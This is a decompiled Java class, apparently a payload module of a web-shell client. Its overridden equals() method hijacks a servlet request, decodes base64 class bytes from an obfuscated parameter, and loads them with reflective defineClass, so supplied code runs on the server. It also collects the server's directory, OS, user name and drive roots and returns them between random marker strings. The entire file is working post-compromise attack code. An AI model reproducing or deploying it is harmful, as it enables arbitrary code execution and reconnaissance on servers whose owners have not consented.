//
// Source code recreated from a .class file by IntelliJ IDEA
// (powered by Fernflower decompiler)
//


import java.io.File;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

public class Info {
    public HttpServletRequest request = null;
    public HttpServletResponse response = null;
    public String encoder = "base64";
    public String cs = "UTF8";
    public String randomPrefix = "2";
    public String decoderClassdata;

    public Info() {
    }

    public boolean equals(Object var1) {
        this.parseObj(var1);
        StringBuffer var2 = new StringBuffer();
        String var3 = "040da52";
        String var4 = "86da9e1ce";
        String var5 = "y2bc7441636204";

        try {
            this.response.setContentType("text/html");
            this.request.setCharacterEncoding(this.cs);
            this.response.setCharacterEncoding(this.cs);
            this.decoderClassdata = this.decode(this.request.getParameter(var5));
            var2.append(this.SysInfoCode());
        } catch (Exception var8) {
            var2.append("ERROR:// " + var8.toString());
        }

        try {
            this.response.getWriter().print(var3 + this.asoutput(var2.toString()) + var4);
        } catch (Exception var7) {
        }

        return true;
    }

    String SysInfoCode() {
        String var1 = System.getProperty("user.dir");
        String var2 = System.getProperty("os.name");
        String var3 = System.getProperty("user.name");
        String var4 = this.WwwRootPathCode(var1);
        return var1 + "\t" + var4 + "\t" + var2 + "\t" + var3;
    }

    String WwwRootPathCode(String var1) {
        StringBuilder var2 = new StringBuilder();
        if (!var1.startsWith("/")) {
            try {
                File[] var3 = File.listRoots();
                File[] var4 = var3;
                int var5 = var3.length;

                for(int var6 = 0; var6 < var5; ++var6) {
                    File var7 = var4[var6];
                    var2.append(var7.toString(), 0, 2);
                }
            } catch (Exception var8) {
                var2.append("/");
            }
        } else {
            var2.append("/");
        }

        return var2.toString();
    }

    public void parseObj(Object var1) {
        if (var1.getClass().isArray()) {
            Object[] var2 = (Object[])((Object[])var1);
            this.request = (HttpServletRequest)var2[0];
            this.response = (HttpServletResponse)var2[1];
        } else {
            try {
                Class var9 = Class.forName("javax.servlet.jsp.PageContext");
                this.request = (HttpServletRequest)var9.getDeclaredMethod("getRequest").invoke(var1);
                this.response = (HttpServletResponse)var9.getDeclaredMethod("getResponse").invoke(var1);
            } catch (Exception var8) {
                if (var1 instanceof HttpServletRequest) {
                    this.request = (HttpServletRequest)var1;

                    try {
                        Field var3 = this.request.getClass().getDeclaredField("request");
                        var3.setAccessible(true);
                        HttpServletRequest var4 = (HttpServletRequest)var3.get(this.request);
                        Field var5 = var4.getClass().getDeclaredField("response");
                        var5.setAccessible(true);
                        this.response = (HttpServletResponse)var5.get(var4);
                    } catch (Exception var7) {
                        try {
                            this.response = (HttpServletResponse)this.request.getClass().getDeclaredMethod("getResponse").invoke(var1);
                        } catch (Exception var6) {
                        }
                    }
                }
            }
        }

    }

    public String asoutput(String var1) {
        try {
            byte[] var2 = this.Base64DecodeToByte(this.decoderClassdata);
            Method var3 = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, Integer.TYPE, Integer.TYPE);
            var3.setAccessible(true);
            Class var4 = (Class)var3.invoke(this.getClass().getClassLoader(), var2, 0, var2.length);
            return var4.getConstructor(String.class).newInstance(var1).toString();
        } catch (Exception var5) {
            return var1;
        }
    }

    String decode(String var1) throws Exception {
        boolean var2 = false;

        try {
            int var5 = Integer.parseInt(this.randomPrefix);
            var1 = var1.substring(var5);
        } catch (Exception var4) {
            var2 = false;
        }

        return this.encoder.equals("base64") ? new String(this.Base64DecodeToByte(var1), this.cs) : var1;
    }

    public byte[] Base64DecodeToByte(String var1) {
        Object var2 = null;
        String var3 = System.getProperty("java.version");

        try {
            Class var4;
            byte[] var7;
            if (var3.compareTo("1.9") >= 0) {
                var4 = Class.forName("java.util.Base64");
                Object var5 = var4.getMethod("getDecoder").invoke((Object)null);
                var7 = (byte[])((byte[])var5.getClass().getMethod("decode", String.class).invoke(var5, var1));
            } else {
                var4 = Class.forName("sun.misc.BASE64Decoder");
                var7 = (byte[])((byte[])var4.getMethod("decodeBuffer", String.class).invoke(var4.newInstance(), var1));
            }

            return var7;
        } catch (Exception var6) {
            return new byte[0];
        }
    }
}
